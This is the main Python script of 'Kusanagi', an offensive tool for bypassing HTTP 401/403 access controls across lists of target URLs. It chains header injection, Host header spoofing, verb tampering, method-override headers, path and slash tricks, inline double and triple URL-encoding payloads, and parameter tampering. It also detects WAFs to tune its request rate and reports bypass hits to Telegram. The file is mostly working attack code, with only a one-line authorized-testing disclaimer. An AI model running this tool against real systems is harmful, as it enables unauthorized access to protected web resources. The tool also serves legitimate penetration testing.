#!/usr/bin/env python3
"""
Kusanagi - 401/403 bypass testing tool.
For authorized security testing only.
"""
import sys
import time
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from kusanagi_core.banner import print_banner
from kusanagi_core.cli import parse_args
from kusanagi_core.colors import C
from kusanagi_core.task import Task
from kusanagi_core.payload_loader import (
    load_headers, load_methods, load_path_templates,
    render_path, render_header,
)
from kusanagi_core.http_client import raw_request, close_all
from kusanagi_core.baseline import get_baseline
from kusanagi_core.analyzer import classify
from kusanagi_core.reporter import Reporter
from kusanagi_core.config_loader import load_config
from kusanagi_core.target_loader import load_targets
from kusanagi_core.telegram_notifier import notify_bypass_found
from kusanagi_core.param_tamper import generate_param_tests
from kusanagi_core.path_slash_bypass import (
    generate_path_slash_bypass, apply_to_url,
)
from kusanagi_core.extended_tests import (
    generate_ip_variant_tasks,
    generate_protocol_switch_tasks,
    generate_sliding_encode_tasks,
    run_wayback_lookup,
)
from kusanagi_core.waf00w import detect_waf, get_safe_threads
from kusanagi_core.rate_limiter import RateLimiter
from kusanagi_core.resume_manager import ResumeManager
from kusanagi_core.json_writer import JsonWriter
from kusanagi_core import screenshot as shot_module


# =====================================================================
#  Helpers
# =====================================================================

def parse_header_line(line: str):
    k, _, v = line.partition(":")
    return k.strip(), v.strip()


def resolve_url(raw_url: str, default_path: str):
    parsed = urlparse(raw_url)
    if not parsed.scheme or not parsed.hostname:
        raise ValueError(f"Invalid URL: {raw_url}")

    scheme = parsed.scheme
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)
    path = parsed.path or ""

    if path in ("", "/"):
        path = "/" + default_path.strip("/")
        full_url = f"{scheme}://{host}:{port}{path}"
        if parsed.query:
            full_url += "?" + parsed.query
    else:
        full_url = raw_url

    return scheme, host, port, path, full_url


def notify(cfg, target, hits, source_label, extra_notes="",
           confident_count=0, low_conf_count=0, total_tested=0):
    tg = cfg.get("telegram", {})
    if not tg.get("enabled"):
        return False
    return notify_bypass_found(
        cfg, target, hits,
        extra_notes=extra_notes,
        source_label=source_label,
        confident_count=confident_count,
        low_conf_count=low_conf_count,
        total_tested=total_tested,
    )


# =====================================================================
#  Verbose formatting
# =====================================================================

def _status_color(status):
    if 200 <= status < 300:
        return C.GREEN
    if 300 <= status < 400:
        return C.CYAN
    if 400 <= status < 500:
        return C.YELLOW
    if 500 <= status < 600:
        return C.MAGENTA
    return C.DIM


def _format_verbose(task, status, target):
    desc = task.desc

    if desc.startswith("H: "):
        return f"{desc[3:]} | status: {status}"

    if desc.startswith("Host: "):
        return f"{desc} | status: {status}"

    if "(via POST)" in desc:
        return f"{desc} | status: {status}"

    if desc.startswith("HTTP/"):
        return f"{desc} | status: {status}"

    if task.url:
        return f"{task.url} | status: {status}"

    return f"{desc} | status: {status}"


# =====================================================================
#  Task execution
# =====================================================================

def _run_one_task(task, args, baseline, reporter, target):
    rate_limiter = getattr(args, "_rate_limiter", None)
    if rate_limiter is not None:
        rate_limiter.wait()

    try:
        status, _headers, body, _ = raw_request(
            task.method, task.url,
            headers=task.headers,
            timeout=args.timeout,
            follow_redirects=args.follow,
            verbose=False,
            http_version=task.http_version,
        )
        size = len(body)
    except Exception as e:
        if args.verbose or args.show_all:
            reporter.error(f"{task.method} {task.desc} -> {e}")
        return

    if getattr(args, "filter_codes", None) and status in args.filter_codes:
        return

    tag, color = classify(status, size, baseline)

    if args.verbose:
        line = _format_verbose(task, status, target)
        sc = _status_color(status)
        with reporter._lock:
            print(f"  {sc}{line}{C.RESET}")
        reporter.track_only(task.desc, task.method, status, size, tag,
                            url=task.url, headers=task.headers)
    else:
        reporter.report(task.desc, task.method, status, size, tag, color,
                        url=task.url, headers=task.headers)


def run_tasks(tasks, executor, args, baseline, reporter, target):
    if not tasks:
        return
    futures = [
        executor.submit(_run_one_task, task, args, baseline, reporter, target)
        for task in tasks
    ]
    for future in as_completed(futures):
        try:
            future.result()
        except Exception:
            pass


def _section_run(reporter, title, tasks, executor, args, baseline, target):
    reporter.section(f"{title} - {len(tasks)} payloads")
    run_tasks(tasks, executor, args, baseline, reporter, target)


# =====================================================================
#  Test sections
# =====================================================================

def test_header_injection(reporter, target, base_headers, headers_list,
                          path, args, baseline, executor):
    tasks = []
    for raw_h in headers_list:
        rendered = render_header(raw_h, path)
        k, v = parse_header_line(rendered)
        hdrs = dict(base_headers)
        hdrs[k] = v
        tasks.append(Task(f"H: {rendered}", "GET", target, hdrs))
    _section_run(reporter, "Header Injection", tasks, executor,
                 args, baseline, target)


def test_header_case(reporter, target, base_headers, case_list,
                     path, args, baseline, executor):
    tasks = []
    for raw_h in case_list:
        rendered = render_header(raw_h, path)
        k, v = parse_header_line(rendered)
        hdrs = dict(base_headers)
        hdrs[k] = v
        tasks.append(Task(f"H: {rendered}", "GET", target, hdrs))
    _section_run(reporter, "Header Case Variation", tasks, executor,
                 args, baseline, target)


def test_host_headers(reporter, target, base_headers, host_list,
                      args, baseline, executor):
    probe_headers = dict(base_headers)
    probe_headers["Host"] = "probe.invalid.example"

    try:
        p_status, _h, p_body, _ = raw_request(
            "GET", target,
            headers=probe_headers,
            timeout=args.timeout,
            follow_redirects=args.follow,
            verbose=False,
        )
        p_size = len(p_body)
    except Exception as e:
        p_status = 0
        p_size = 0
        if args.verbose:
            print(f"  {C.DIM}[probe error] {e}{C.RESET}")

    effective_baseline = baseline
    if p_status in (401, 403):
        print(f"  {C.YELLOW}[i] Host-based access control detected "
              f"(bogus Host -> {p_status}, size {p_size}B){C.RESET}")
        effective_baseline = {
            "status": p_status,
            "size": p_size,
            "body": p_body if p_status else b"",
            "headers": {},
        }
    else:
        print(f"  {C.DIM}[i] No Host-based control detected "
              f"(bogus Host -> {p_status}){C.RESET}")

    tasks = []
    for raw_h in host_list:
        hdrs = dict(base_headers)
        if raw_h == "__NONE__":
            tasks.append(Task("Host: (default/omitted)", "GET", target, hdrs))
            continue
        k, v = parse_header_line(raw_h)
        hdrs[k] = v
        tasks.append(Task(f"H: {raw_h}", "GET", target, hdrs))

    _section_run(reporter, "Host Header Variation", tasks, executor,
                 args, effective_baseline, target)


def test_ip_variants(reporter, target, base_headers, args, baseline, executor):
    tasks = list(generate_ip_variant_tasks(target, base_headers))
    _section_run(reporter, "IP Variant x Header", tasks, executor,
                 args, baseline, target)


def test_method_override(reporter, target, base_headers, args, baseline, executor):
    override_headers = ["X-HTTP-Method-Override", "X-HTTP-Method",
                        "X-Method-Override"]
    override_values = ["GET", "PUT", "DELETE", "PATCH", "HEAD"]

    tasks = []
    for oh in override_headers:
        for ov in override_values:
            hdrs = dict(base_headers)
            hdrs[oh] = ov
            tasks.append(Task(f"{oh}: {ov} (via POST)",
                              "POST", target, hdrs))
    _section_run(reporter, "HTTP Method Override", tasks, executor,
                 args, baseline, target)


def test_verb_tampering(reporter, target, base_headers, methods_list,
                        args, baseline, executor):
    tasks = [
        Task(f"Method: {m}", m, target, base_headers)
        for m in methods_list
    ]
    _section_run(reporter, "HTTP Verb Tampering", tasks, executor,
                 args, baseline, target)


def test_http_version_downgrade(reporter, target, base_headers,
                                args, baseline, executor):
    tasks = [
        Task(f"HTTP/{ver}", "GET", target, base_headers, http_version=ver)
        for ver in ["1.0", "1.1"]
    ]
    _section_run(reporter, "HTTP Protocol Version Switch", tasks, executor,
                 args, baseline, target)


def test_protocol_switch(reporter, target, base_headers, args, baseline, executor):
    tasks = list(generate_protocol_switch_tasks(target, base_headers))
    if not tasks:
        return
    _section_run(reporter, "Protocol Scheme Switch", tasks, executor,
                 args, baseline, target)


def test_path_manipulation(reporter, target, scheme, host, port, path,
                           path_tpls, base_headers, args, baseline, executor):
    tasks = []
    for tpl in path_tpls:
        new_path = render_path(tpl, path)
        if not new_path.startswith("/"):
            new_path = "/" + new_path
        new_url = f"{scheme}://{host}:{port}{new_path}"
        tasks.append(Task(f"Path: {new_path}", "GET", new_url, base_headers))
    _section_run(reporter, "Path Manipulation", tasks, executor,
                 args, baseline, target)


def test_path_slash_bypass(reporter, target, path, base_headers,
                           args, baseline, executor):
    tests = generate_path_slash_bypass(path)
    if not tests:
        return
    tasks = []
    for desc, new_path in tests:
        new_url = apply_to_url(target, new_path)
        tasks.append(Task(desc, "GET", new_url, base_headers))
    _section_run(reporter, "Path Slash Bypass", tasks, executor,
                 args, baseline, target)


def test_double_encoding(reporter, target, path, base_headers,
                         args, baseline, executor):
    raw_path = path
    p = raw_path if raw_path.startswith("/") else "/" + raw_path
    p_clean = p.strip("/")

    payloads = []

    if p_clean:
        first = p_clean[0]
        rest = p_clean[1:]
        payloads.append(f"/%25{format(ord(first), '02x')}{rest}")

    for frag in [
        f"%252f{p_clean}",
        f"%252F{p_clean}",
        f"/{p_clean}%252f",
        f"/{p_clean}%252F",
        f"/%252e%252f{p_clean}",
        f"/%252e/{p_clean}",
        f"/%252e%252e%252f{p_clean}",
        f"/%252e%252e/{p_clean}",
        f"%25252f{p_clean}",
        f"/%25252e{p_clean}",
        f"/%25252e%25252f{p_clean}",
        f"/%25252e%25252e%25252f{p_clean}",
    ]:
        payloads.append(frag if frag.startswith("/") else "/" + frag)

    if p_clean and len(p_clean) <= 40:
        full = "".join(
            "%25" + format(ord(c), "02x") if c not in "/" else "/"
            for c in p_clean
        )
        payloads.append(f"/{full}")

    seen = set()
    unique = []
    for x in payloads:
        if x not in seen:
            seen.add(x)
            unique.append(x)

    tasks = []
    for payload in unique:
        new_url = apply_to_url(target, payload)
        tasks.append(Task(f"DblEnc: {payload}", "GET", new_url, base_headers))
    _section_run(reporter, "Double/Triple URL Encoding", tasks, executor,
                 args, baseline, target)


def test_sliding_encode(reporter, target, scheme, host, port, path,
                        base_headers, args, baseline, executor):
    tasks = list(generate_sliding_encode_tasks(
        scheme, host, port, path, base_headers
    ))
    if not tasks:
        return
    _section_run(reporter, "Sliding Character Encode", tasks, executor,
                 args, baseline, target)


def test_param_tampering(reporter, target, base_headers, args, baseline, executor):
    tests = generate_param_tests(target)
    if not tests:
        return
    tasks = [
        Task(desc, "GET", url, base_headers)
        for desc, url in tests
    ]
    _section_run(reporter, "Parameter Tampering", tasks, executor,
                 args, baseline, target)


def test_override_headers(reporter, target, scheme, host, port, path,
                          override_list, base_headers, args, baseline, executor):
    root_url = f"{scheme}://{host}:{port}/"
    tasks = []
    for raw_h in override_list:
        rendered = render_header(raw_h, path)
        k, v = parse_header_line(rendered)
        hdrs = dict(base_headers)
        hdrs[k] = v
        tasks.append(Task(f"H: {rendered}", "GET", root_url, hdrs))
    _section_run(reporter, "Path Override Headers", tasks, executor,
                 args, baseline, target)


# =====================================================================
#  Screenshot runner
# =====================================================================

def run_screenshots_for_target(target, reporter, args):
    """Take screenshots — one per test category."""
    hits = reporter.confident_hits
    if not hits:
        return []

    print(f"\n{C.BOLD}{C.BLUE}--- [ Screenshots ] "
          f"-----------------------------------{C.RESET}")
    print(f"  {C.DIM}One screenshot per test category "
          f"(up to {args.screenshot_max}) into {args.screenshot}/{C.RESET}")

    results = shot_module.take_screenshots(
        target, hits, args.screenshot,
        max_count=args.screenshot_max,
    )

    ok_count = 0
    for r in results:
        cat = r.get("category", "Other")
        if r.get("ok"):
            ok_count += 1
            print(f"  {C.GREEN}[✓]{C.RESET} {C.BOLD}{cat:<25}{C.RESET} "
                  f"[{r.get('status')}] {r.get('method')}")
            print(f"      {C.DIM}-> {r['path']}{C.RESET}")
        else:
            print(f"  {C.YELLOW}[!]{C.RESET} {cat} "
                  f"-> {r.get('error', 'unknown error')}")

    print(f"  {C.GREEN}[+] {ok_count}/{len(results)} screenshots saved.{C.RESET}")
    return results


# =====================================================================
#  Orchestration
# =====================================================================

def run_single_target(target_url, args, cfg, payloads, json_writer=None):
    (headers_list, case_list, host_list,
     override_list, methods_list, path_tpls) = payloads

    try:
        scheme, host, port, path, target = resolve_url(target_url, args.path)
    except ValueError as e:
        print(f"{C.RED}[!] {e}{C.RESET}")
        return

    print(f"\n{C.BOLD}{C.MAGENTA}===== TARGET: {target} ====={C.RESET}")

    # === WAF / CDN detection ===
    threads = max(1, int(args.threads))
    if not args.no_waf00w:
        print(f"{C.BOLD}[*]{C.RESET} Detecting WAF/CDN ...")
        behind_waf, waf_name = detect_waf(target, timeout=args.timeout)
        if behind_waf:
            if args.waf_threads is not None:
                threads = max(1, args.waf_threads)
                print(f"{C.YELLOW}[!] WAF/CDN detected: {waf_name}"
                      f" — threads forced to {threads} (--waf-threads).{C.RESET}")
            else:
                auto_threads = get_safe_threads(waf_name, default=threads)
                threads = min(threads, auto_threads)
                print(f"{C.YELLOW}[!] WAF/CDN detected: {waf_name}"
                      f" — reducing threads to {threads}.{C.RESET}")
        else:
            print(f"{C.DIM}[i] No WAF/CDN detected (threads={threads}).{C.RESET}")
    else:
        print(f"{C.DIM}[i] WAF detection skipped (--no-waf00w).{C.RESET}")

    # === Rate limiter ===
    args._rate_limiter = RateLimiter(args.delay)

    reporter = Reporter(
        show_all=args.show_all,
        output_path=args.output,
    )
    reporter.info("Target", target, C.CYAN)
    reporter.info("Host", host)
    reporter.info("Path", path)
    reporter.info("Timeout", f"{args.timeout}s")
    reporter.info("Threads", str(threads), C.GREEN)
    if args.delay > 0:
        reporter.info("Delay", f"{args.delay}s", C.MAGENTA)

    if getattr(args, "filter_codes", None):
        codes = ", ".join(str(c) for c in sorted(args.filter_codes))
        reporter.info("Filtering", f"hiding codes: {codes}", C.MAGENTA)

    base_headers = {"User-Agent": args.ua}
    if args.cookie:
        base_headers["Cookie"] = args.cookie

    baseline = get_baseline(
        target,
        headers=base_headers,
        timeout=args.timeout,
        follow=args.follow,
    )
    reporter.info(
        "Baseline",
        f"{baseline['status']} (size {baseline['size']}B)",
        C.YELLOW,
    )

    if baseline["status"] not in (401, 403):
        print(f"{C.YELLOW}[!] Baseline is not 401/403 - "
              f"results may include noise.{C.RESET}")

    start_ts = time.time()

    # ===== Run all test sections =====
    with ThreadPoolExecutor(max_workers=threads) as executor:
        test_header_injection(reporter, target, base_headers,
                              headers_list, path, args, baseline, executor)
        test_header_case(reporter, target, base_headers,
                         case_list, path, args, baseline, executor)
        test_host_headers(reporter, target, base_headers,
                          host_list, args, baseline, executor)
        test_ip_variants(reporter, target, base_headers,
                         args, baseline, executor)
        test_method_override(reporter, target, base_headers,
                             args, baseline, executor)
        test_verb_tampering(reporter, target, base_headers,
                            methods_list, args, baseline, executor)
        test_http_version_downgrade(reporter, target, base_headers,
                                    args, baseline, executor)
        test_protocol_switch(reporter, target, base_headers,
                             args, baseline, executor)
        test_path_manipulation(reporter, target, scheme, host, port, path,
                               path_tpls, base_headers, args, baseline, executor)
        test_path_slash_bypass(reporter, target, path, base_headers,
                               args, baseline, executor)
        test_double_encoding(reporter, target, path, base_headers,
                             args, baseline, executor)
        test_sliding_encode(reporter, target, scheme, host, port, path,
                            base_headers, args, baseline, executor)
        test_param_tampering(reporter, target, base_headers,
                             args, baseline, executor)
        test_override_headers(reporter, target, scheme, host, port, path,
                              override_list, base_headers, args, baseline, executor)

    reporter.summary()
    print(f"{C.DIM}[i] Scan took {time.time() - start_ts:.1f}s{C.RESET}")

    if args.wayback:
        run_wayback_lookup(target)

    # ===== Screenshots =====
    if args.screenshot:
        run_screenshots_for_target(target, reporter, args)

    # ===== JSON =====
    if json_writer is not None:
        json_writer.add_target(
            target, reporter,
            baseline={"status": baseline["status"],
                      "size": baseline["size"]},
        )

    # ===== Telegram =====
    all_hits = list(reporter.confident_hits) + list(reporter.low_conf_hits)
    confident_count = len(reporter.confident_hits)
    low_conf_count = len(reporter.low_conf_hits)
    total_tested = reporter.total

    tg_enabled = cfg.get("telegram", {}).get("enabled", False)
    if not tg_enabled:
        print(f"\n{C.DIM}[i] Telegram disabled in config.{C.RESET}")
        reporter.close()
        return

    if all_hits:
        ok = notify(
            cfg, target, all_hits,
            source_label="Kusanagi",
            extra_notes="<i>Found by Kusanagi core</i>",
            confident_count=confident_count,
            low_conf_count=low_conf_count,
            total_tested=total_tested,
        )
        if ok:
            print(f"\n{C.GREEN}[+] Telegram sent "
                  f"({confident_count} confirmed + "
                  f"{low_conf_count} possible).{C.RESET}")
        else:
            print(f"\n{C.YELLOW}[!] Telegram failed "
                  f"(check token/chat_id).{C.RESET}")
    else:
        print(f"\n{C.DIM}[i] No hits — Telegram not sent.{C.RESET}")

    reporter.close()


def main():
    args = parse_args()
    print_banner()

    if args.threads < 1:
        args.threads = 1

    if args.delay < 0:
        args.delay = 0.0

    # === Screenshot availability check ===
    if args.screenshot:
        if not shot_module.is_available():
            print(f"{C.RED}[!] --screenshot requested but Playwright is not "
                  f"installed.{C.RESET}")
            print(f"{C.DIM}    pip install playwright && "
                  f"playwright install chromium{C.RESET}")
            print(f"{C.DIM}    Continuing without screenshots.{C.RESET}\n")
            args.screenshot = ""

    cfg = load_config(args.config)

    if args.telegram is not None:
        cfg["telegram"]["enabled"] = args.telegram
    if args.thread_id is not None:
        cfg["telegram"]["thread_id"] = str(args.thread_id)

    # === Resume ===
    resume_mgr = None
    if args.resume:
        resume_mgr = ResumeManager(args.resume_file)
        if args.reset_resume:
            resume_mgr.reset()
            print(f"{C.YELLOW}[i] Resume file reset: {args.resume_file}{C.RESET}")
        else:
            print(f"{C.BOLD}[*]{C.RESET} Resume file: {args.resume_file} "
                  f"({resume_mgr.count()} targets already done)")

    # === JSON ===
    json_writer = None
    if args.json:
        json_writer = JsonWriter(args.json)
        print(f"{C.BOLD}[*]{C.RESET} JSON output: {args.json}")

    try:
        payloads = (
            load_headers(f"{args.payloads_dir}/headers.txt"),
            load_headers(f"{args.payloads_dir}/header_case.txt"),
            load_headers(f"{args.payloads_dir}/host_headers.txt"),
            load_headers(f"{args.payloads_dir}/override_headers.txt"),
            load_methods(f"{args.payloads_dir}/methods.txt"),
            load_path_templates(f"{args.payloads_dir}/paths.txt"),
        )
    except FileNotFoundError as e:
        print(f"{C.RED}[!] {e}{C.RESET}")
        sys.exit(1)

    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        try:
            targets.extend(load_targets(args.file))
        except FileNotFoundError as e:
            print(f"{C.RED}[!] {e}{C.RESET}")
            sys.exit(1)

    if not targets:
        print(f"{C.RED}[!] No targets to test.{C.RESET}")
        sys.exit(1)

    print(f"{C.BOLD}[*]{C.RESET} Loaded "
          f"{C.CYAN}{len(targets)}{C.RESET} target(s) "
          f"| threads: {C.GREEN}{args.threads}{C.RESET}"
          + (f" | delay: {C.MAGENTA}{args.delay}s{C.RESET}" if args.delay > 0 else ""))

    skipped = 0
    for i, t in enumerate(targets, 1):
        if resume_mgr is not None and resume_mgr.is_done(t):
            skipped += 1
            print(f"{C.DIM}[{i}/{len(targets)}] SKIP (already done): {t}{C.RESET}")
            continue

        print(f"\n{C.BOLD}{C.BLUE}[{i}/{len(targets)}]{C.RESET} {t}")
        try:
            run_single_target(t, args, cfg, payloads, json_writer=json_writer)
            if resume_mgr is not None:
                resume_mgr.mark_done(t)
        except KeyboardInterrupt:
            raise
        except Exception as e:
            print(f"{C.RED}[!] Failed on {t}: {e}{C.RESET}")

    if resume_mgr is not None and skipped > 0:
        print(f"\n{C.GREEN}[+] Skipped {skipped} already-tested target(s).{C.RESET}")

    if json_writer is not None:
        json_writer.close()
        print(f"{C.GREEN}[+] JSON written to: {args.json}{C.RESET}")

    close_all()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[!] Interrupted.{C.RESET}")
        sys.exit(130)